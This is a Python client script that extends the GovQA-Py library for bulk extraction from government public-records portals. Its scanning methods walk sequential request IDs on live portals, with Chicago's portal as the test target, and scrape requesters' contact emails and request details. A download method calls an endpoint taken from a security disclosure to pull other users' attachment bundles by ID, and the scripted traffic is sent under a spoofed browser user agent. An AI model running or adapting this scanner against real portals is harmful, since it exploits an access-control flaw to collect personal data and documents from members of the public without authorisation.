#!/usr/bin/env python3
"""
GovQA Extended Client

Extends the GovQA-Py library with additional capabilities:
- Request ID enumeration for bulk extraction
- Direct endpoint access
- Session reuse
- Rate limiting
- Checkpoint/resume support
"""

import json
import re
import time
from datetime import datetime
from pathlib import Path
from typing import Any, Generator, Optional
from urllib.parse import urljoin

import lxml.html
import requests
from govqa import GovQA
from govqa.base import UnauthenticatedError

from govqa_config import (
    API_ENDPOINTS,
    DELAYS,
    OUTPUT_DIR,
    SELECTORS,
    GovQAJurisdiction,
)


class GovQAExtendedClient:
    """
    Extended GovQA client with bulk extraction capabilities.

    Wraps the GovQA-Py library and adds:
    - Public request enumeration via ID scanning
    - Direct HTTP access for discovered endpoints
    - Rate limiting and retry logic
    - Progress checkpointing
    """

    def __init__(self, jurisdiction: GovQAJurisdiction):
        """
        Initialize the extended client.

        :param jurisdiction: Jurisdiction configuration
        """
        self.jurisdiction = jurisdiction
        self.domain = jurisdiction.domain
        self.tenant = jurisdiction.tenant

        # Initialize base client
        self._client = None
        self._session = requests.Session()
        self._session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        })

        # Rate limiting
        self._last_request_time = 0

        # Output paths
        self.output_dir = OUTPUT_DIR / self.tenant
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.checkpoint_file = self.output_dir / "checkpoint.json"

    def _rate_limit(self, delay_type: str = "between_requests"):
        """Apply rate limiting between requests."""
        delay = DELAYS.get(delay_type, 2.0)
        elapsed = time.time() - self._last_request_time
        if elapsed < delay:
            time.sleep(delay - elapsed)
        self._last_request_time = time.time()

    def _build_url(self, endpoint: str, session_id: str = "") -> str:
        """Build full URL for an endpoint."""
        if session_id:
            path = f"/WEBAPP/_rs/(S({session_id}))/{endpoint}"
        else:
            path = f"/WEBAPP/_rs/{endpoint}"
        return urljoin(self.domain, path)

    def initialize_base_client(self) -> bool:
        """
        Initialize the base GovQA-Py client.

        :returns: True if successful
        """
        try:
            self._client = GovQA(domain=self.domain)
            return True
        except Exception as e:
            print(f"Failed to initialize GovQA client: {e}")
            return False

    def login(self, username: str, password: str) -> bool:
        """
        Login to the GovQA portal.

        :param username: Account email
        :param password: Account password
        :returns: True if login successful
        """
        if not self._client:
            self.initialize_base_client()

        try:
            self._client.login(username, password)
            # Copy session cookies to our requests session
            self._session.cookies.update(self._client.session.cookies)
            return True
        except UnauthenticatedError:
            return False
        except Exception as e:
            print(f"Login error: {e}")
            return False

    def list_my_requests(self) -> list:
        """
        List requests for the authenticated user.
        Wrapper around GovQA-Py's list_requests().

        :returns: List of request dicts with id, reference_number, status
        """
        if not self._client:
            raise UnauthenticatedError("Not logged in")
        return self._client.list_requests()

    def get_my_request(self, request_id: int) -> dict:
        """
        Get full details of an authenticated user's request.
        Wrapper around GovQA-Py's get_request().

        :param request_id: Request ID
        :returns: Request dict with messages and attachments
        """
        if not self._client:
            raise UnauthenticatedError("Not logged in")
        return self._client.get_request(request_id)

    # ==================== Bulk Extraction Methods ====================

    def probe_request_id(self, rid: int, use_session: bool = False) -> Optional[dict]:
        """
        Probe a single request ID to see if it's accessible.

        :param rid: Request ID to probe
        :param use_session: Use authenticated session (if logged in)
        :returns: Request data dict or None if not accessible
        """
        self._rate_limit()

        url = self._build_url(f"RequestOpen.aspx?rid={rid}")

        try:
            if use_session and self._client:
                response = self._client.get(url)
            else:
                response = self._session.get(url, timeout=30)

            if response.status_code != 200:
                return None

            # Check if we got actual content vs redirect/error
            if "supporthome.aspx" in response.url.lower():
                return None  # Redirected to home - not found

            if "Page Temporarily Unavailable" in response.text:
                return None

            # Parse the response
            return self._parse_request_page(response.text, rid)

        except Exception as e:
            print(f"Error probing rid={rid}: {e}")
            return None

    def _parse_request_page(self, html: str, rid: int) -> Optional[dict]:
        """
        Parse a request page HTML to extract data.

        :param html: HTML content
        :param rid: Request ID
        :returns: Parsed request dict or None
        """
        try:
            tree = lxml.html.fromstring(html)

            # Try to extract basic info
            request = {
                "id": rid,
                "timestamp": datetime.now().isoformat(),
                "raw_html_length": len(html)
            }

            # Reference number
            ref_elements = tree.xpath(SELECTORS["reference_number"])
            if ref_elements:
                request["reference_number"] = ref_elements[0].strip()

            # Request type
            type_elements = tree.xpath(SELECTORS["request_type"])
            if type_elements:
                request["request_type"] = type_elements[0].strip()

            # Contact email
            email_elements = tree.xpath(SELECTORS["contact_email"])
            if email_elements:
                request["contact_email"] = email_elements[0].strip()

            # Check if we got any meaningful data
            if len(request) <= 3:  # Only id, timestamp, raw_html_length
                return None

            return request

        except Exception as e:
            print(f"Parse error for rid={rid}: {e}")
            return None

    def scan_request_ids(
        self,
        start_id: int,
        end_id: int,
        batch_size: int = 100,
        use_session: bool = False
    ) -> Generator[dict, None, None]:
        """
        Scan a range of request IDs for accessible records.

        :param start_id: Starting request ID
        :param end_id: Ending request ID
        :param batch_size: Save checkpoint every N records
        :param use_session: Use authenticated session
        :yields: Request dicts for found records
        """
        found_count = 0
        scanned_count = 0

        # Load checkpoint if exists
        checkpoint = self._load_checkpoint()
        if checkpoint and checkpoint.get("last_scanned_id"):
            last_id = checkpoint["last_scanned_id"]
            if last_id >= start_id and last_id < end_id:
                print(f"Resuming from checkpoint: rid={last_id + 1}")
                start_id = last_id + 1

        print(f"Scanning request IDs {start_id} to {end_id}...")

        for rid in range(start_id, end_id + 1):
            scanned_count += 1

            # Progress indicator
            if scanned_count % 100 == 0:
                print(f"  Progress: {scanned_count} scanned, {found_count} found (current: rid={rid})")

            # Probe the ID
            result = self.probe_request_id(rid, use_session=use_session)

            if result:
                found_count += 1
                yield result

            # Checkpoint
            if scanned_count % batch_size == 0:
                self._save_checkpoint({
                    "last_scanned_id": rid,
                    "total_scanned": scanned_count,
                    "total_found": found_count,
                    "timestamp": datetime.now().isoformat()
                })

        # Final checkpoint
        self._save_checkpoint({
            "last_scanned_id": end_id,
            "total_scanned": scanned_count,
            "total_found": found_count,
            "timestamp": datetime.now().isoformat(),
            "completed": True
        })

        print(f"Scan complete: {scanned_count} scanned, {found_count} found")

    def download_attachments(self, request_id: int) -> Optional[str]:
        """
        Download attachments for a request using the JSON API endpoint.

        Based on security disclosure:
        POST /RequestEdit.aspx/DownloadAll
        Body: { "itemId": <id> }
        Response: { "d": "/temp/<id>.zip" }

        :param request_id: Request ID
        :returns: Download URL path or None
        """
        self._rate_limit()

        url = self._build_url("RequestEdit.aspx/DownloadAll")

        try:
            response = self._session.post(
                url,
                json={"itemId": request_id},
                headers={"Content-Type": "application/json; charset=utf-8"},
                timeout=30
            )

            if response.status_code == 200:
                data = response.json()
                if "d" in data:
                    return data["d"]

        except Exception as e:
            print(f"Error downloading attachments for rid={request_id}: {e}")

        return None

    # ==================== Checkpoint Methods ====================

    def _load_checkpoint(self) -> Optional[dict]:
        """Load checkpoint from file."""
        if self.checkpoint_file.exists():
            try:
                with open(self.checkpoint_file) as f:
                    return json.load(f)
            except:
                pass
        return None

    def _save_checkpoint(self, data: dict):
        """Save checkpoint to file."""
        with open(self.checkpoint_file, 'w') as f:
            json.dump(data, f, indent=2)

    def save_results(self, results: list, filename: str = None):
        """
        Save extraction results to JSON file.

        :param results: List of result dicts
        :param filename: Output filename (default: records_<timestamp>.json)
        """
        if not filename:
            filename = f"records_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        output_file = self.output_dir / filename

        output_data = {
            "jurisdiction": {
                "name": self.jurisdiction.name,
                "tenant": self.jurisdiction.tenant,
                "domain": self.jurisdiction.domain,
                "type": self.jurisdiction.jurisdiction_type,
                "state": self.jurisdiction.state,
            },
            "extraction": {
                "timestamp": datetime.now().isoformat(),
                "record_count": len(results),
            },
            "records": results
        }

        with open(output_file, 'w') as f:
            json.dump(output_data, f, indent=2, default=str)

        print(f"Results saved to: {output_file}")
        return output_file


def test_id_scanning():
    """Test the ID scanning functionality."""
    from govqa_config import get_jurisdiction

    # Test with Chicago
    jurisdiction = get_jurisdiction("chicagoil")
    if not jurisdiction:
        print("Chicago jurisdiction not found in config")
        return

    print(f"\nTesting ID scanning on {jurisdiction.name}...")

    client = GovQAExtendedClient(jurisdiction)

    if not client.initialize_base_client():
        print("Failed to initialize client")
        return

    # Scan a small range to test
    print("\nScanning request IDs 1-100 (test range)...")
    results = []

    for record in client.scan_request_ids(1, 100, batch_size=50):
        results.append(record)
        print(f"  Found: rid={record['id']}, ref={record.get('reference_number', 'N/A')}")

    print(f"\nTotal found: {len(results)}")

    if results:
        client.save_results(results, "test_scan_results.json")


if __name__ == "__main__":
    test_id_scanning()
